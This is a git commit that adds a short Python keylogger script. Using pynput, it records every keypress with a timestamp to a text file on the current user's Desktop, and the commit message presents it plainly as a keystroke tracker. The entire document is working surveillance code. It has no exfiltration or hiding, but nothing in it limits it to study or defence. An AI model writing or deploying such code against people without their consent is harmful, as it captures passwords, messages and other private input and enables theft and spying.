f199c83f30af544bc3e13893aca667ede8e4de21
Dimitrios Chatzitopalis <55722721+Mitsarolas@users.noreply.github.com>
2020-11-25 20:27:01 +0200

    Add files via upload
    A python script that keeps tracking your keyboard inputs in a .txt log file

---
+++ keylogger.py
@@ -0,0 +1,20 @@
+from pynput.keyboard import Listener
+
+import os
+import logging
+from shutil import copyfile
+
+username = os.getlogin()
+logging_directory = f"C:/Users/{username}/Desktop"
+
+# .txt file hosting your key logs, txt file is mandatory in this senario
+logging.basicConfig(filename=f"{logging_directory}/mylog.txt",
+                    level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+
+def key_handler(key):
+    logging.info(key)
+
+
+with Listener(on_press=key_handler) as listener:
+    listener.join()
